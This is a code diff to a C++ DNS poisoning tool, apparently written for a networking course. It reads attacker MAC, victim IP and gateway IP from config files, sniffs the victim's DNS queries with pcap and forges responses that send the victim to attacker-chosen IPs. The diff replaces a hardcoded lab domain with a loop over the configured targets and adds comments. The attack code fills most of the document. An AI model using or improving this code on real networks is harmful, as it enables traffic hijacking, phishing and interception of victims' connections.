@@ -13,10 +13,29 @@
 #include <fstream>
 #include <sstream>
 
+/*
+ * Entry point of the application.
+ *
+ * Params:
+ *      int argc: The number of command line arguments.
+ *
+ *      const char *argv[]: The command line arguments.
+ */
 int main(int argc, const char *argv[]) {
     // Read strings from config file
     std::unordered_map<std::string, std::string> properties = getConfig("poisoner.conf");
-    std::unordered_map<std::string, std::string> domainsToPoison = getConfig("spoofed_domains.conf");
+    std::unordered_map<std::string, std::string> domainsToPoison =
+        getConfig("spoofed_domains.conf");
+
+    std::unordered_map<std::string, std::string> rawDomainIpPairs =
+        getConfig("spoofed_domains.conf");
+    for (auto kvp : rawDomainIpPairs) {
+        std::cout << kvp.first << " " << kvp.second << std::endl;
+    }
+
+    // parse the poison targets
+    struct DnsSniffArgs dnsSniffArgs;
+    dnsSniffArgs.targets = convertToVector(rawDomainIpPairs);
 
     // convert all the values from the config file to the correct format
     unsigned char attackerMac[ETH_ALEN];
@@ -28,23 +47,22 @@ int main(int argc, const char *argv[]) {
     const char *tmp;
 
     tmp = properties["attackerMac"].c_str();
-    if (sscanf(tmp, "%x:%x:%x:%x:%x:%x", &attackerMac[0],
-               &attackerMac[1], &attackerMac[2], &attackerMac[3], &attackerMac[4],
-               &attackerMac[5]) != 6) {
+    if (sscanf(tmp, "%x:%x:%x:%x:%x:%x", &attackerMac[0], &attackerMac[1], &attackerMac[2],
+               &attackerMac[3], &attackerMac[4], &attackerMac[5]) != 6) {
         std::cerr << "could not parse attackerMac" << std::endl;
         return 0;
     }
 
     tmp = properties["victimIp"].c_str();
-    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &victimIpChar[0], &victimIpChar[1],
-               &victimIpChar[2], &victimIpChar[3]) != 4) {
+    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &victimIpChar[0], &victimIpChar[1], &victimIpChar[2],
+               &victimIpChar[3]) != 4) {
         std::cerr << "could not parse victimIp" << std::endl;
         return 0;
     }
 
     tmp = properties["gatewayIp"].c_str();
-    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &gatewayIpChar[0], &gatewayIpChar[1],
-               &gatewayIpChar[2], &gatewayIpChar[3]) != 4) {
+    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &gatewayIpChar[0], &gatewayIpChar[1], &gatewayIpChar[2],
+               &gatewayIpChar[3]) != 4) {
         std::cerr << "could not parse gatewayIp" << std::endl;
         return 0;
     }
@@ -117,11 +135,10 @@ int main(int argc, const char *argv[]) {
     // start dns sniffing
     std::cout << "starting dns sniff" << std::endl;
 
-    struct DnsSniffArgs dnsSniffArgs;
     dnsSniffArgs.net = &ipEngine;
     dnsSniffArgs.victimIp = &victimIp;
     dnsSniffArgs.gatewayIP = &gatewayIp;
-	dnsSniffArgs.targets = convertToVector(domainsToPoison);
+    dnsSniffArgs.targets = convertToVector(domainsToPoison);
     std::thread dnsThread(dnsSpoof, &dnsSniffArgs);
 
     std::cout << "dns sniffing started" << std::endl;
@@ -143,6 +160,13 @@ int main(int argc, const char *argv[]) {
     return 0;
 }
 
+/*
+ * Starts DNS spoofing using pcap_loop.
+ *
+ * Params:
+ *      struct DnsSniffArgs args: A structure containing parameters used by the DNS callback
+ *      function.
+ */
 void dnsSpoof(struct DnsSniffArgs *args) {
     int i;
 
@@ -189,20 +213,21 @@ void dnsSpoof(struct DnsSniffArgs *args) {
     pcap_freealldevs(allDevs);
 }
 
-
-
+/*
+ * The callback function that gets called when a DNS packet is captured with pcap_loop.
+ *
+ * Params:
+ *      unsigned char *args: The user supplied arguments.
+ *
+ *      const struct pcap_pkthdr *header: A header containing meta data about the packet.
+ *
+ *      const unsigned char *packet: The sniffed packet.
+ */
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet) {
     struct DnsSniffArgs *params = (struct DnsSniffArgs *)args;
-	
-	std::vector<struct DomainIpPair> pairs = params->targets;
+    std::vector<struct DomainIpPair> pairs = params->targets;
     // this is the domain ip pair struct
-    struct DomainIpPair pair;
-
-	// Copy IP from first element of vector 
-	memcpy(&pair.ip, &pairs[0].ip, sizeof(struct in_addr));
-    unsigned char addressFilter[] = {0x09, 'm', 'i', 'l', 'l', 'i',  'w', 'a', 'y', 's', 0x04, 'b', 'c', 'i', 't', 0x02, 'c', 'a', 0x00};
-    memcpy(pair.name, addressFilter, sizeof(addressFilter));
 
     struct iphdr *ip;
     struct udphdr *udp;
@@ -219,15 +244,21 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     sin.sin_port = udp->dest;
     sin.sin_addr.s_addr = ip->saddr;
 
-    // TODO: use this funciton to find the correct DomainIpPair to use for poisoning
-    bool isTarget = isSameQuestion(pair.name, query);
+    // find the first element that matches
+    int i;
+    for (i = 0; i < pairs.size(); i++) {
+        if (isSameQuestion(pairs[i].name, query)) {
+            break;
+        }
+    }
 
-    if (dns->qr == DNS_QUERY && ip->saddr == params->victimIp->s_addr && isTarget) {
-        int responseSize = forgeDns(dns, &pair.ip, params->buffer + 20 + 8);
-        fillIpUdpHeader(params->buffer, ip->daddr, ip->saddr, udp->dest, udp->source,
-                        responseSize);
-        sendto(params->rawSocket, params->buffer, 20 + 8 + responseSize, 0,
-                           (struct sockaddr *)&sin, sizeof(sin));
+    // if this is a dns query from the victim and the query is for a domain we are poisoning
+    if (dns->qr == DNS_QUERY && ip->saddr == params->victimIp->s_addr && i != pairs.size()) {
+        // poison it
+        int responseSize = forgeDns(dns, &pairs[i].ip, params->buffer + 20 + 8);
+        fillIpUdpHeader(params->buffer, ip->daddr, ip->saddr, udp->dest, udp->source, responseSize);
+        sendto(params->rawSocket, params->buffer, 20 + 8 + responseSize, 0, (struct sockaddr *)&sin,
+               sizeof(sin));
         std::cout << "poisoning response" << std::endl;
     }
 }
